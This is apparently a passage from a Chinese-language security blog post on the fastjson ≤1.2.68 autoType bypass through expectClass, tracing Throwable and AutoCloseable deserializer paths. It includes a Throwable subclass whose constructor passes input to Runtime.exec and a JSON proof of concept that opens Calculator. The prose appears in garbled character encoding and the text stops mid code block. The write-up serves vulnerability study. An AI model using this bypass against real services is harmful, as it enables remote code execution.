<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419234427409.png" alt="image-20230419234427409"  />
</p>
<p>è¿™ä¸ªå®‰å…¨ä¿®å¤ä¸º fastjson å¸¦æ¥äº†ä¸€å®šæ—¶é—´çš„å¹³é™ï¼Œç›´åˆ° 1.2.68 ç‰ˆæœ¬å‡ºç°äº†æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š<code>fastjson &lt;= 1.2.68</code>
æè¿°ï¼šåˆ©ç”¨ expectClass ç»•è¿‡ <code>checkAutoType()</code> ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡å®‰å…¨æ£€æŸ¥çš„æ€è·¯çš„å»¶ä¼¸ã€‚ä¸»è¦ä½¿ç”¨ <code>Throwable</code> å’Œ <code>AutoCloseable</code> è¿›è¡Œç»•è¿‡ã€‚</p>
</blockquote>
<p>ç‰ˆæœ¬ 1.2.68 æœ¬èº«æ›´æ–°äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æ§åˆ¶ç‚¹ safeModeï¼Œå¦‚æœåº”ç”¨ç¨‹åºå¼€å¯äº† safeModeï¼Œå°†åœ¨ <code>checkAutoType()</code> ä¸­ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯å®Œå…¨ç¦æ­¢ autoTypeï¼Œä¸å¾—ä¸è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸€åŠ³æ°¸é€¸çš„ä¿®å¤æ–¹å¼ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202847981.png" alt="image-20221014202847981"  />
</p>
<p>ä½†ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªç‰ˆæœ¬æŠ¥å‡ºäº†ä¸€ä¸ªæ–°çš„ <code>autoType</code> å¼€å…³ç»•è¿‡æ–¹å¼ï¼šåˆ©ç”¨ <code>expectClass</code> ç»•è¿‡ <code>checkAutoType()</code>ã€‚</p>
<p>åœ¨ <code>checkAutoType()</code> å‡½æ•°ä¸­æœ‰è¿™æ ·çš„é€»è¾‘ï¼šå¦‚æœå‡½æ•°æœ‰ <code>expectClass</code> å…¥å‚ï¼Œä¸”æˆ‘ä»¬ä¼ å…¥çš„ç±»åæ˜¯ <code>expectClass</code> çš„å­ç±»æˆ–å®ç°ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡ <code>checkAutoType()</code> çš„å®‰å…¨æ£€æµ‹ã€‚(<code>isAssignableFrom(clazz) </code>åˆ¤å®šæ­¤ <code>Class</code> å¯¹è±¡æ‰€è¡¨ç¤ºçš„ç±»æˆ–æ¥å£ä¸æŒ‡å®šçš„ <code>Class</code> å‚æ•°æ‰€è¡¨ç¤ºçš„ç±»æˆ–æ¥å£æ˜¯å¦ç›¸åŒï¼Œæˆ–æ˜¯å¦æ˜¯å…¶è¶…ç±»æˆ–è¶…æ¥å£)ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014203353318.png" alt="image-20221014203353318"  />
</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾ä¸€ä¸‹ <code>checkAutoType()</code> å‡ ä¸ªé‡è½½æ–¹æ³•æ˜¯å¦æœ‰å¯æ§çš„ <code>expectClass</code> çš„å…¥å‚æ–¹å¼ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†ä»¥ä¸‹å‡ ä¸ªç±»ï¼š</p>
<ul>
<li><code>ThrowableDeserializer#deserialze()</code></li>
<li><code>JavaBeanDeserializer#deserialze()</code></li>
</ul>
<h4 id="throwabledeserializeråˆ©ç”¨">ThrowableDeserializeråˆ©ç”¨<a hidden class="anchor" aria-hidden="true" href="#throwabledeserializeråˆ©ç”¨">#</a></h4>
<p>å¦‚æœä¼ å…¥çš„æ˜¯<code>java.lang.Throwable</code>ç±»ï¼Œé‚£ä¹ˆå…¶å¯¹åº”çš„ååºåˆ—åŒ–è§£æå™¨ä¸º<code>ThrowableDeserializer</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420011313060.png" alt="image-20230420011313060"  />
</p>
<p><code>ThrowableDeserializer#deserialze()</code> æ–¹æ³•ç›´æ¥å°† <code>@type</code> åçš„ç±»ä¼ å…¥ <code>checkAutoType()</code> ï¼Œå¹¶ä¸” expectClass ä¸º <code>Throwable.class</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014203518433.png" alt="image-20221014203518433"  />
</p>
<p>é€šè¿‡ <code>checkAutoType()</code> ä¹‹åï¼Œå°†ä½¿ç”¨ <code>createException</code> æ¥åˆ›å»ºå¼‚å¸¸ç±»çš„å®ä¾‹ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014203606317.png" alt="image-20221014203606317"  />
</p>
<p>è¿™å°±å½¢æˆäº† <code>Throwable</code> å­ç±»ç»•è¿‡ <code>checkAutoType()</code> çš„æ–¹å¼ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ° <code>Throwable</code> çš„å­ç±»ï¼Œè¿™ä¸ªç±»çš„ <code>getter/setter/static block/constructor</code> ä¸­å«æœ‰å…·æœ‰å¨èƒçš„ä»£ç é€»è¾‘ã€‚</p>
<p>å› ä¸º<code>Throwable</code>ç±»æ—¢æ²¡æœ‰åœ¨é»‘ç™½åå•é‡Œé¢ï¼Œä¹Ÿä¸åœ¨ç¼“å­˜é‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥æŒ‡å®š<code>ExpectClas</code>ä¸º<code>Throwable</code></p>
<p><code>java.lang.Exception</code>ç»§æ‰¿äº†<code>Throwable</code>ç±»ï¼Œå¹¶ä¸”ä¹Ÿåœ¨<code>mappings</code>ä¸­çš„ç¼“å­˜ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420013213376.png" alt="image-20230420013213376"  />
</p>
<p>è¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰å®ç°äº†ä¸€ä¸ªç»§æ‰¿äº†<code>Throwable</code>ç±»çš„å­ç±»ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> com.reus09.Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName ExecException
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/20 01:08
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> ExecThrowable <span style="color:#fff;font-weight:bold">extends</span> Throwable{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> String domain;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">public</span>(String domain){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(domain);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (IOException e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getDomain() {
</span></span><span style="display:flex;"><span>				
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> setDomain(String domain) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">domain</span> = domain;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> String getMessage() {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">super</span>.<span style="color:#007f7f">getMessage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬çš„<code>Poc</code>å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>:<span style="color:#0ff;font-weight:bold">&#34;java.lang.Exception&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.reus09.Evil.ExecThrowable&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="font-weight:bold">&#34;domain&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;open /System/Applications/Calculator.app&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="è°ƒè¯•-1">è°ƒè¯•<a hidden class="anchor" aria-hidden="true" href="#è°ƒè¯•-1">#</a></h5>
<p>ç¬¬ä¸€æ¬¡æ˜¯ä¼ å…¥java.lang.Exceptionç±»è¿›è¡Œæ ¡éªŒï¼Œè¿™é‡ŒCheckAutoType()å‡½æ•°çš„expectClasså‚æ•°æ˜¯ä¸ºnullçš„ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420013717973.png" alt="image-20230420013717973"  />
</p>
<p>æ¥ç€ç›´æ¥ä»ç¼“å†²<code>mappings</code>ä¸­è·å–åˆ°äº†<code>java.lang.Exception</code>ç±»</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420013830945.png" alt="image-20230420013830945"  />
</p>
<p>ç„¶ååˆ¤æ–­clazzæ˜¯å¦ ä¸æ˜¯expectClassç±»çš„ç»§æ‰¿ç±»ä¸”ä¸æ˜¯HashMapç±»å‹ï¼Œæ˜¯çš„è¯æŠ›å‡ºå¼‚å¸¸ï¼Œå¦åˆ™ç›´æ¥è¿”å›è¯¥ç±»ã€‚è¿™é‡Œæ²¡æœ‰expectClasså°±ç›´æ¥è¿”å›<code>java.lang.Exception</code>ç±»ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420014015758.png" alt="image-20230420014015758"  />
</p>
<p>ç„¶åå›åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬çš„<code>java.lang.Exception</code>å®é™…ä¸Šæ˜¯<code>Throwable</code>ç±»çš„å­ç±»ï¼Œæ‰€ä»¥å®ƒçš„ååºåˆ—åŒ–å™¨ä¸º<code>ThrowableDeserializer</code>ã€‚ç„¶åè°ƒç”¨<code>ThrowableDeserializer</code>çš„deserializeæ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420014347635.png" alt="image-20230420014347635"  />
</p>
<p>åœ¨<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>çš„æ–¹æ³•é‡Œé¢ï¼Œ<code>exClassName</code>è·å–POCä¸­ä¸‹ä¸€ä¸ª@typeæŒ‡å®šçš„ClassNameï¼Œç„¶åå†æ¬¡è°ƒç”¨<code>checkAutoType</code>å‡½æ•°ï¼Œå¹¶ä¸”ä¼ å…¥çš„<code>expectClass</code>ä¸º<code>Throwable</code>ã€‚<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420014520052.png" alt="image-20230420014520052"  />
</p>
<p><code>com.reus09.Evil.ExecThrowable</code>è¿™ä¸ªç±»æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„ï¼Œä¸æ˜¯é»‘ã€ç™½åå•ä¸Šé¢çš„ç±»ï¼Œä¹Ÿä¸å­˜åœ¨ç¼“å­˜mappingsä¸­ï¼Œå¹¶ä¸”å› ä¸ºä¼ å…¥çš„<code>expectClass</code>æ˜¯<code>Throwable</code>ç±»ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰ç±»æ˜¯<code>Throwable</code>çš„å­ç±»ï¼Œå› æ­¤<code>expectClassFlag</code>ä¸ºtrueã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015047001.png" alt="image-20230420015047001"  />
</p>
<p>æ¥ç€ä¼šç»•è¿‡é»‘ç™½åå•çš„æ£€æµ‹ï¼Œç»è¿‡<code>autoTypeSupport</code>ä¸ºtrueæˆ–falseçš„ä¸¤ç§æƒ…å†µçš„æ£€æŸ¥ï¼Œç”±äºexpectClassFlagä¸ºtrueï¼Œè¿›å…¥å¦‚ä¸‹çš„loadClass()é€»è¾‘æ¥åŠ è½½ç›®æ ‡ç±»ï¼Œç”±äºAutoTypeå…³é—­ä¸”jsonTypeä¸ºfalseï¼Œå› æ­¤è°ƒç”¨loadClass()å‡½æ•°çš„æ—¶å€™æ˜¯ä¸å¼€å¯cacheå³ç¼“å­˜çš„ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015325128.png" alt="image-20230420015325128"  />
</p>
<p>ä½¿ç”¨<code>AppClassLoader</code>æ¥åŠ è½½<code>com.reus09.Evil.ExecThrowable</code>ç±»å¹¶è¿”å›ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015439609.png" alt="image-20230420015439609"  />
</p>
<p>æ¥ç€åˆ¤æ–­jsonTypeï¼Œå¦‚æœä¸ºtrueçš„è¯ç›´æ¥æ·»åŠ Mappingç¼“å­˜å¹¶è¿”å›ç±»ï¼Œå¦åˆ™æ¥ç€åˆ¤æ–­è¿”å›çš„ç±»æ˜¯å¦æ˜¯ClassLoaderã€DataSourceã€RowSetç­‰ç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œè¿™å®ç°è¿‡æ»¤å¤§å¤šæ•°JNDIæ³¨å…¥Gadgetï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015719196.png" alt="image-20230420015719196"  />
</p>
<p>å¾€ä¸‹ï¼Œå¦‚æœexpectClassä¸ä¸ºnullï¼Œåˆ™åˆ¤æ–­ç›®æ ‡ç±»æ˜¯å¦æ˜¯expectClassç±»çš„å­ç±»ï¼Œæ˜¯çš„è¯å°±æ·»åŠ åˆ°Mappingç¼“å­˜ä¸­å¹¶ç›´æ¥è¿”å›è¯¥ç›®æ ‡ç±»ï¼Œå¦åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼Œå› æ­¤è¿™é‡Œæ¶æ„ç±»å¿…é¡»è¦å®ç°<code>Throwable</code>ç±»</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420015805147.png" alt="image-20230420015805147"  />
</p>
<p><code>checkAutoType</code>è°ƒç”¨å®Œåï¼Œå°±æ‰§è¡Œ<code>createException</code>å‡½æ•°æ¥åˆ›å»ºå¼‚å¸¸ç±»çš„å®ä¾‹ï¼Œåœ¨é‡Œé¢åå°„è°ƒç”¨æ„é€ å‡½æ•°ï¼Œç„¶åå®ä¾‹åŒ–ã€‚å®ç°è§¦å‘æ¼æ´ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230420020330889.png" alt="image-20230420020330889"  />
</p>
<h4 id="javabeandeserializeråˆ©ç”¨">JavaBeanDeserializeråˆ©ç”¨<a hidden class="anchor" aria-hidden="true" href="#javabeandeserializeråˆ©ç”¨">#</a></h4>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> (expectClass == <span style="color:#fff;font-weight:bold">null</span>) {     
</span></span><span style="display:flex;"><span>  expectClassFlag = <span style="color:#fff;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#fff;font-weight:bold">else</span> <span style="color:#fff;font-weight:bold">if</span> (expectClass != Object.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Serializable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Cloneable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Closeable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != EventListener.<span style="color:#007f7f">class</span>  &amp;&amp; expectClass != Iterable.<span style="color:#007f7f">class</span> &amp;&amp; expectClass != Collection.<span style="color:#007f7f">class</span>) {
</span></span><span style="display:flex;"><span>  expectClassFlag = <span style="color:#fff;font-weight:bold">true</span>;
</span></span><span style="display:flex;"><span>}<span style="color:#fff;font-weight:bold">else</span>{  
</span></span><span style="display:flex;"><span>  expectClassFlag = <span style="color:#fff;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯¹äºè¿™æ®µä»£ç æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„æœŸæœ›ç±»ï¼Œä¸æ˜¯<code>objectã€Serializableã€Cloneableã€Closeableã€EventListenerã€Iterableã€Collection</code>è¿™äº›ç±»ï¼Œå¹¶ä¸”ä»–ä¹Ÿä¸èƒ½åœ¨é»‘åå•é‡Œé¢<code>https://github.com/LeadroyaL/fastjson-blacklist</code>ï¼Œå¹¶ä¸”è¿™ä¸ªç±»éœ€è¦åœ¨ç¼“å­˜mappingsä¸­ï¼Œæ‰¾åˆ°äº†<code>java.lang.AutoCloseable</code>å’Œ<code>java.util.BitSet</code>ä¸¤ä¸ªæ¥å£ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬è‡ªå®šä¹‰å®ç°äº†ä¸€ä¸ªç»§æ‰¿äº†<code>AutoCloseable</code>ç±»çš„å­ç±»ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
